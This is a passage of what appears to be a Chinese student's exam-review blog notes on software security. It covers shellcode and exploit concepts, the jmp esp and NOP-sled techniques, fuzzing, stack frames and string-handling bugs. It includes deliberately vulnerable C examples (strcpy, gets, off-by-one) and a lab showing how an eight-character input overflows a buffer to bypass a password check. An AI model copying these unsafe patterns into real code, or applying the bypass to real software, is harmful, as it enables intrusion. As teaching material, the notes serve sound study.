<p><strong>（4）SQL注入漏洞：</strong>通过<strong>控制传递给软件数据库操作语句的关键变量</strong>来获得<strong>恶意控制软件数据库、获取有用信息或者制造恶意破坏的</strong>，甚至是控制用户计算机系统的漏洞。</p>
<p>4.软件漏洞的危害：<strong>无法正常使用</strong>、引发<strong>恶性事件、关键数据丢失</strong>、<strong>秘密信息泄漏</strong>、<strong>被安装木马病毒</strong>。</p>
<p>5.安全漏洞出现的原因：<strong>小作坊式的软件开发</strong>、<strong>赶进度</strong>带来的弊端、被轻视的<strong>软件安全测试</strong>、淡薄的<strong>安全思想</strong>、不完善的<strong>安全维护</strong>。<strong>（从开发（小作坊、安全意识、赶进度）、测试、维护的角度）</strong></p>
<h3 id="漏洞利用技术"><a href="#漏洞利用技术" class="headerlink" title="漏洞利用技术"></a>漏洞利用技术</h3><p>1.shellcode与exploit的概念</p>
<p>Shellcode：指缓冲区溢出过程中植入进程的<strong>代码</strong></p>
<p>exploit：指代码植入过程，或<strong>漏洞利用过程</strong></p>
<p>（2）shellcode通常是Exploit的一部分，Exploit负责打开门，shellcode决定通过门后要做什么。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/6f82a48f934b55ea9b0635d5f039852.png" alt="6f82a48f934b55ea9b0635d5f039852.png"></p>
<p>2.定位shellcode，栈帧移位与jmp esp</p>
<p><strong>栈帧移位：</strong>指程序每次装入运行时，<strong>其地址会发生变换。</strong>由于<strong>移位</strong>的现象，导致<strong>静态地址</strong>的输入下，shellcode的注入攻击不能每次都成功，无法适应动态内存的变化。</p>
<p><strong>Jmp esp：</strong>由于上述静态地址输入情况下的弊端，可以<strong>借助ESP来适应内存动态变化</strong>！思想如下：由于ESP在每次函数执行完，函数栈帧清除时，指向返回地址的下一个位置，该相对位置不受栈帧移位的变化！那么，可以将shellcode注入在紧跟返回地址（返回地址被覆盖为JMP ESP）之后，并通过JMP ESP的方式，调用shellcode！该方法不受内存变化的影响。示意图如下：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%201.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%202.png" alt="image.png"></p>
<p>但是，上面这种shellcode放入缓冲区的布置，会有一些问题：万一系统进行push操作，可能会破坏shellcode数据！我们可以选择<strong>抬高栈顶（修改ESP）</strong>，以保护shellcode！或者，在shellcode之前添加<strong>多个NOP</strong>，增加“靶子面积”。同样地，如果retn指令不确定位置，也可以放置<strong>多个retn</strong>，以确保命中。</p>
<p>3.缓冲区的组成</p>
<p>（1）<strong>填充物：</strong>可以是任何值，但是一般<strong>用NOP指令对应的0x90</strong>来进行填充，这样只要能跳进填充区，处理器最终也能顺序执行到shellcode。</p>
<p>（2）<strong>淹没返回地址的数据</strong>：可以是<strong>跳转指令</strong>的地址，shellcode的起始地址，或者近似的shellcode地址。（跳转进NOP填充区）</p>
<p>（3）<strong>shellcode</strong>：可执行的<strong>机器代码</strong>。</p>
<h3 id="漏洞挖掘与模糊测试"><a href="#漏洞挖掘与模糊测试" class="headerlink" title="漏洞挖掘与模糊测试"></a><strong>漏洞挖掘与模糊测试</strong></h3><p>1.Fuzz测试（考12分大题，简述思想，描述针对文件的Fuzz测试步骤流程）</p>
<p>（1）Fuzz的主要目的：<strong>崩溃、中断、销毁。</strong></p>
<p>（2）测试用例往往是<strong>带有攻击性的畸形数据</strong>用以触发各种类型的漏洞。<strong>因为Fuzz往往可以触发一个缓冲区溢出的漏洞</strong>，但<strong>却不能实现有效的exploit。</strong>测试人员需要<strong>实时地捕捉目标程序抛出的异常、发生的崩溃和寄存器</strong>等信息，综合判断这些错误是不是真正的可利用漏洞。</p>
<p>（3）技术思想：<strong>利用暴力</strong>来实现对目标程序的<strong>自动化测试</strong>，然后<strong>监视检查其最后的结果</strong>，如果<strong>符合某种情况</strong>就认为程序可能<strong>存在某种漏洞或者问题</strong>。暴力是利用<strong>不断地向目标程序发送</strong>或者<strong>传递不同格式的数据</strong>来测试目标程序的反应。</p>
<p>（4）优缺点：优点是<strong>很少出现误报</strong>，<strong>能够迅速地找到真正的漏洞</strong>；缺点是<strong>Fuzz永远不能保证系统里已经没漏洞。</strong>即使我们用Fuzz找到了100个严重的漏洞，系统中仍然可能存在第101个漏洞。</p>
<p>2.文件格式Fuzz测试的基本方法步骤</p>
<p>（1）以一个<strong>正常的文件模板</strong>作为基础，按照一定规则产生一批<strong>畸形文件</strong>。</p>
<p>（2）将畸形文件<strong>逐一送入软件进行解析</strong>，并<strong>监视软件是否会抛出异常</strong>。</p>
<p>（3）记录<strong>软件产生的错误信息</strong>，如寄存器状态、栈状态等。</p>
<p>（4）用<strong>日志或其他UI形式向测试人员展示异常信息</strong>，以进一步<strong>鉴定这些错误是否能被利用</strong>。</p>
<h2 id="缓冲区溢出基础"><a href="#缓冲区溢出基础" class="headerlink" title="缓冲区溢出基础"></a>缓冲区溢出基础</h2><h3 id="缓冲区溢出知识"><a href="#缓冲区溢出知识" class="headerlink" title="缓冲区溢出知识"></a>缓冲区溢出知识</h3><p>1.缓冲区溢出：指当计算机<strong>向缓冲区内填充数据位数</strong>时<strong>超过了缓冲区本身的容量，</strong>溢出的数据<strong>覆盖在合法数据上。</strong>可通过修改下列参数来<strong>利用缓冲区溢出</strong>：<strong>变量、数据指针、函数指针、栈返回地址。</strong></p>
<h3 id="系统栈的工作原理"><a href="#系统栈的工作原理" class="headerlink" title="系统栈的工作原理"></a>系统栈的工作原理</h3><p>1.内存的不同用途：成功地利用缓冲区溢出漏洞<strong>可以修改内存中的变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。</strong></p>
<p><strong>2.寄存器相关知识</strong></p>
<p>（1）EAX一般<strong>用来做返回值</strong></p>
<p>（2）ECX用于<strong>记数</strong></p>
<p>（3）EIP：<strong>扩展指令指针。</strong>在<strong>调用一个函数</strong>时，这个指针被<strong>存储在堆栈中</strong>，用于后面的使用。在<strong>函数返回时</strong>，这个被存储的地址<strong>被用于决定下一个将被执行的指令的地址</strong>。</p>
<p>（4）ESP：<strong>扩展堆栈指针。</strong>这个寄存器<strong>指向堆栈的当前位置</strong>，并允许通过<strong>使用push和pop操作或者直接的指针操作</strong>来对堆栈中的内容进行添加和移除。</p>
<p>（5）EBP：<strong>扩展基指针。</strong>主要用与<strong>存放在进入call以后的ESP的值</strong>，便于<strong>退出的时候回复ESP的值</strong>，达到<strong>堆栈平衡</strong>的目的。</p>
<p><strong>3.进程使用的内存分类（填空题，考了n次）</strong></p>
<p>（1）<strong>代码区：</strong>存储着<strong>被装入执行的二进制机器代码</strong>，处理器会到这个区域取指并执行。</p>
<p>（2）<strong>数据区：存储全局变量</strong>等。</p>
<p>（3）<strong>堆区：</strong>进程可以<strong>在堆区动态地请求一定大小的内存</strong>，并在用完之后<strong>归还</strong>给堆区。<strong>动态分配和回收</strong>是堆区的特点。</p>
<p>（4）<strong>栈区：</strong>用于动态地<strong>存储函数之间的调用关系</strong>，以保证被调用函数在返回时恢复到父函数中继续执行。</p>
<p>4.函数调用的变化（知道栈帧存储顺序）</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%203.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%204.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%205.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%206.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%207.png" alt="image.png"></p>
<p>5.寄存器与函数栈帧</p>
<p>（1）每一个函数独占自己的<strong>栈帧空间</strong>。当前正在运行的函数的栈帧总是<strong>在栈顶</strong>。Win32系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧。</p>
<p>①ESP：<strong>栈指针寄存器</strong>，其内存放着一个指针，该指针永远指向<strong>系统栈最上面的一个栈帧的栈顶。</strong></p>
<p>②EBP：<strong>基址指针寄存器</strong>，其内存放着一个指针，该指针永远指向<strong>系统栈最上面的一个栈帧的底部。</strong></p>
<p>③EIP：<strong>指令寄存器，</strong>其内存放着一个指针，该指针永远指向一条<strong>等待执行的指令地址</strong>。可以说如果控制了EIP寄存器的内容，就控制了进程我们让<strong>EIP指向哪里，CPU就会去执行哪里的指令。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%208.png" alt="image.png"></p>
<p>（2）在函数栈帧中，一般包含以下几类重要信息。（考了n次）</p>
<p><strong>①参数</strong></p>
<p><strong>②局部变量：</strong>为函数局部变量<strong>开辟的内存空间。</strong></p>
<p><strong>③栈帧状态值：</strong>保存前<strong>栈帧的顶部和底部</strong>（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。</p>
<p><strong>④函数返回地址：</strong>保存当前函数调用前的<strong>断点信息</strong>，也就是<strong>函数调用前的指令位置</strong>，以便在函数返回时能够<strong>恢复到函数被调用前的代码区中</strong>继续执行指令。</p>
<p>（这样记忆：从底到高，分别是retn函数返回地址、ebp栈帧状态值、局部变量。）</p>
<p>6.函数调用约定与相关指令</p>
<p><strong>（1）函数调用步骤</strong></p>
<p><strong>①参数入栈：</strong>将参数<strong>从右向左</strong>一次压入系统栈中。</p>
<p><strong>②返回地址入栈：</strong>将当前代码区<strong>调用指令的下一跳指令地址</strong>压入栈中，<strong>供函数返回时</strong>继续执行。</p>
<p><strong>③代码区跳转：</strong>处理器从当前代码区<strong>跳转到被调用函数的入口处</strong>。</p>
<p><strong>④栈帧调整：</strong>保存当前<strong>栈帧的状态值</strong>，以备后面恢复本栈帧时使用<strong>（EBP入栈）</strong>；将当前栈帧切换到新栈帧<strong>（将ESP值装入EBP，更新栈帧底部）</strong>；给新栈帧分配空间<strong>（把ESP减去所需空间的大小，抬高栈帧）</strong>。</p>
<p>（2）_stdcall调用约定的指令序列</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%209.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2010.png" alt="image.png"></p>
<p>（3）函数调用时系统栈的变化过程</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2011.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2012.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2013.png" alt="image.png"></p>
<p><strong>7.函数返回的步骤</strong></p>
<p>（1）<strong>保存返回值：</strong>通常将函数的返回值<strong>保存在寄存器EAX中。</strong></p>
<p>（2）<strong>弹出当前栈帧，恢复上一个栈帧，</strong>具体包括：在堆栈平衡的基础上，<strong>给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间。</strong>将当前<strong>栈帧底部保存的前栈帧EBP值弹入EBP寄存器，</strong>恢复上一个栈帧。将函数返回地址<strong>弹给EIP寄存器</strong>。</p>
<p>（3）<strong>跳转</strong>：按照函数返回地址<strong>跳回母函数中</strong>继续执行。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2014.png" alt="image.png"></p>
<h3 id="修改邻接变量（实验部分）"><a href="#修改邻接变量（实验部分）" class="headerlink" title="修改邻接变量（实验部分）"></a>修改邻接变量（实验部分）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD “1234567”</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span>* password)</span>&#123;</span><br><span class="line"><span class="type">int</span> authenticated;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);<span class="comment">//字符串比较函数</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer,password);<span class="comment">//这里会发生溢出 //字符串复制函数</span></span><br><span class="line"><span class="keyword">return</span> authenticated;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(“please input password:”);</span><br><span class="line"><span class="built_in">scanf</span>(“%s”,password);</span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line"><span class="keyword">if</span>(valid_flag)&#123;</span><br><span class="line"><span class="built_in">printf</span>(“incorrect password!\n”);&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(“Congratulations!You have passed the verification!\n”);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2015.png" alt="image.png"></p>
<p>1.修改邻接变量的原理</p>
<p>（1）authenticated为int类型，在内存中是一个DWORD，占4个字节。所以，如果让buffer数组越界，buffer[8]、buffer[9]、buffer[10]、buffer[11]将写入相邻的变量authenticated中。</p>
<p>（2）观察一下源代码不难发现，authenticated变量的值来源于<strong>strcmp函数的返回值</strong>，之后会返回给main函数作为<strong>密码验证成功与否的标志变量</strong>；当<strong>authenticated为0时，标识验证成功</strong>；反之则不成功。</p>
<p>（3）如果我们输入的密码<strong>超过了7个字符（注意：字符串截断符NULL将占用一个字节）</strong>，则越界字符的ASCII码<strong>会修改掉authenticated的值。</strong>如果这段溢出数据恰好把authenticated改为0，则程序流程将被改变。实验的目的：<strong>用非法的超长密码去修改buffer的邻接变量authenticated从而绕过密码验证程序。</strong></p>
<p>2.如何突破密码验证程序</p>
<p>（1）假如我们输入密码为7个英文字母”q”，按照字符串的关系<strong>”qqqqqqq”&gt;”1234567”,strcmp应该返回1，即authenticated为1。</strong></p>
<p>（2）那么我们经过分析可以发现，如果我们输入的是8个q，那么他的最后以为NULL会淹没authenticated的数据。</p>
<p>（3）Authenticated会变成0x00000000，那么判断分支则会走向正确的方向，就会绕过密码验证程序。</p>
<p>3.并不是所有的8位字符串都能得到想要的结果，这是为什么呢？</p>
<p>（1）由于authenticated的值来源于字<strong>符串比较函数strcmp的返回值</strong>。</p>
<p>（2）按照字符串的序关系，当输入字符串<strong>大于“1234567”时，会返回1</strong>，内存中的值为0x00000001，可以淹没地位突破验证</p>
<p>（3）那么当输入字符串<strong>小于“1234567”时，会返回-1</strong>，而变量在内存中的值按照双字-1的补码存放，为0xFFFFFFFF，低位被淹没后便成了0xFFFFFF00，这是的值是不能冲破验证程序的。<strong>如“01234567”就不可以。</strong></p>
<h2 id="字符串安全"><a href="#字符串安全" class="headerlink" title="字符串安全"></a>字符串安全</h2><h3 id="背景和常见问题"><a href="#背景和常见问题" class="headerlink" title="背景和常见问题"></a>背景和常见问题</h3><p>1.C风格的字符串</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2016.png" alt="image.png"></p>
<p>（1）C风格的字符串<strong>由一个连续的字符序列</strong>组成，并以一个<strong>空字符</strong>作为结束。</p>
<p>（2）一个指向字符串的指针实际上就是<strong>指向该字符串的起始字符</strong>。</p>
<p>（3）字符串<strong>长度</strong>指<strong>空字符之前的字节数</strong></p>
<p>（4）字符串的<strong>值</strong>则是它所包含的<strong>按顺序排列</strong>的字符序列。</p>
<p>（5）存储一个字符串所需要的字节数是<strong>字符串的字符数加1</strong>。</p>
<p>3.UTF-8：UTF-8是一种变长字节编码方式。对于某一个字符的UTF-8编码，如果只有一个字节则其最高二进制位为0；如果是多字节，其第一个字节从最高位开始，连续的二进制位值为1的个数决定了其编码的位数，其余各字节均以10开头。UTF-8最多可用到6个字节。（有一道题）</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/086c8a9d78c8209e82731cafc631a2e.png" alt="086c8a9d78c8209e82731cafc631a2e.png"></p>
<h3 id="常见的字符串操作错误"><a href="#常见的字符串操作错误" class="headerlink" title="常见的字符串操作错误"></a>常见的字符串操作错误</h3><p>最常见的错误有（考了n次了）：<strong>无界字符串复制、空结尾错误、字符串截断、差一错误、数组写入越界、不恰当的数据处理</strong></p>
<h4 id="1-无边界字符串复制"><a href="#1-无边界字符串复制" class="headerlink" title="1.无边界字符串复制"></a>1.无边界字符串复制</h4><p>无界字符串越界写操作的有：<strong>gets()、strcpy()、strcat()、memcpy()、memset()。</strong></p>
<p>（1）定义：发生于从一个<strong>无边界数据源复制数据</strong>到一个<strong>定长的字符数组</strong>时。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">char</span> Password[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Enter 8 character password:&quot;</span>);</span><br><span class="line">gets(Password);</span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure>

<p>（2）下面<strong>复制和连接字符串时</strong>也容易出现错误，因为<strong>标准strcpy()和strcat()函数</strong>执行的都是<strong>无边界复制操作。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="type">char</span> name[<span class="number">2048</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(name, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(name, <span class="string">&quot; = &quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(name, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 上面三个函数都会越界写</span></span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure>

<p>（3）简单的解决方案：利用<strong>strlen()测试输入字符串的长度</strong>然后<strong>动态分配内存</strong>。</p>
<p>动态分配的代码题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">**<span class="type">char</span> *buff = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])+<span class="number">1</span>);** </span><br><span class="line"><span class="comment">// 确保为argv[1]中的**命令行参数以及末尾空字符**分配足够内存</span></span><br><span class="line"><span class="keyword">if</span> (buff!= <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argv[1] = %s.\n&quot;</span>, buff);&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Couldn&#x27;t get the memory - recover */</span>&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>（4）C++无界字符串复制：对于下列的C++程序，<strong>如果用户输入多于11个字符，</strong>也会导致越界写。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">12</span>];</span><br><span class="line">cin &gt;&gt; buf;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;echo: &quot;</span> &lt;&lt; buf &lt;&lt; endl;&#125;</span><br></pre></td></tr></table></figure>

<p>（5）C++简单的解决方案</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">12</span>];</span><br><span class="line">cin.<span class="built_in">width</span>(<span class="number">12</span>);</span><br><span class="line"><span class="comment">/* 如果其域宽（继承自ios_base：：width）被设置为大于0，提取操作可以被限制为只提取指定数量的字符 */</span></span><br><span class="line">cin &gt;&gt; buf; <span class="comment">// 一次提取操作调用结束后**域宽被重置为0**</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;echo: &quot;</span> &lt;&lt; buf &lt;&lt; endl; &#125; </span><br></pre></td></tr></table></figure>

<h4 id="2-差一错误"><a href="#2-差一错误" class="headerlink" title="2.差一错误"></a><strong>2.差一错误</strong></h4><p>考试题：以下程序预期的打印结果有几种情况？3</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="type">char</span> source[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(source, <span class="string">&quot;0123456789&quot;</span>);</span><br><span class="line"><span class="type">char</span> *dest = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(source));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">11</span>; i++) &#123;</span><br><span class="line">dest[i] = source[i];&#125;</span><br><span class="line">dest[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;dest = %s&quot;</span>, dest);&#125;</span><br></pre></td></tr></table></figure>

<p>（1）source字符数组（第2行声明）<strong>为10字节，</strong>但strcpy()（第3行）却<strong>对其复制了11个字节，包括一个结尾空字符串</strong></p>
<p>（2）malloc()（第4行）在<strong>堆上分配长度等于source字符串长度的内存</strong>。然而，strlen()返回的<strong>长度值并没考虑结尾空字符</strong></p>
<p>（3）for循环的索引值i（第5行）是<strong>从1开始</strong>的，但C中<strong>数组索引值是从0开始</strong>的</p>
<p>（4）for循环结束条件是<strong>i&lt;&#x3D;11</strong>，可能比程序员期待的<strong>多迭代一次</strong></p>
<p>（5）第7行的<strong>赋值操作会导致越界写</strong></p>
<h4 id="3-空结尾错误"><a href="#3-空结尾错误" class="headerlink" title="3.空结尾错误"></a><strong>3.空结尾错误</strong></h4><p>（1）当使用C风格字符时，另一个常见的问题是<strong>字符串末尾没有正确的空字符。</strong></p>
<p>练习题：给这段代码问你是什么错误</p>
